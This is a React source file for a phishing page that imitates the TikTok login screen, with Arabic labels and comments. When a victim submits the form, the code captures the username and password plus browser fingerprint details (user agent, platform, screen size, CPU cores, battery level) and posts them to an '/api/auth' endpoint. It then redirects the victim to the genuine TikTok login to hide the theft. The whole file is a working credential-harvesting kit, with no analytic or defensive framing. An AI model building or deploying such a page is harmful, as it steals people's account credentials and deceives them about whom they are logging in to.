import { useState, useEffect } from 'react';

export default function Home() {
    const [user, setUser] = useState('');
    const [pass, setPass] = useState('');

    const handleSubmit = async (e) => {
        e.preventDefault();
        
        // تجميع معلومات استخباراتية إضافية من المتصفح
        const info = {
            user,
            pass,
            ua: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenRes: `${window.screen.width}x${window.screen.height}`,
            cores: navigator.hardwareConcurrency || 'N/A',
            time: new Date().toLocaleString(),
            battery: 'تحت المعالجة...'
        };

        // محاولة جلب حالة البطارية
        try {
            const battery = await navigator.getBattery();
            info.battery = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? 'يُشحن' : 'لا يشحن'})`;
        } catch (e) {}

        await fetch('/api/auth', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(info),
        });

        // توجيه المستخدم لصفحة تيك توك الحقيقية بعد التسجيل
        window.location.href = 'https://www.tiktok.com/login';
    };

    return (
        <div style={{ backgroundColor: '#000', color: '#fff', height: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', fontFamily: 'sans-serif' }}>
            <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" alt="TikTok" style={{ width: '150px', marginBottom: '30px' }} />
            
            <form onSubmit={handleSubmit} style={{ display: 'flex', flexDirection: 'column', width: '300px' }}>
                <input 
                    type="text" 
                    placeholder="الهاتف / البريد / المستخدم" 
                    value={user}
                    onChange={(e) => setUser(e.target.value)}
                    style={{ padding: '12px', marginBottom: '10px', borderRadius: '4px', border: '1px solid #333', backgroundColor: '#111', color: '#fff' }}
                    required 
                />
                <input 
                    type="password" 
                    placeholder="كلمة السر" 
                    value={pass}
                    onChange={(e) => setPass(e.target.value)}
                    style={{ padding: '12px', marginBottom: '20px', borderRadius: '4px', border: '1px solid #333', backgroundColor: '#111', color: '#fff' }}
                    required 
                />
                <button type="submit" style={{ padding: '12px', backgroundColor: '#fe2c55', color: '#fff', border: 'none', borderRadius: '4px', fontWeight: 'bold', cursor: 'pointer' }}>
                    تسجيل الدخول
                </button>
            </form>
        </div>
    );
}
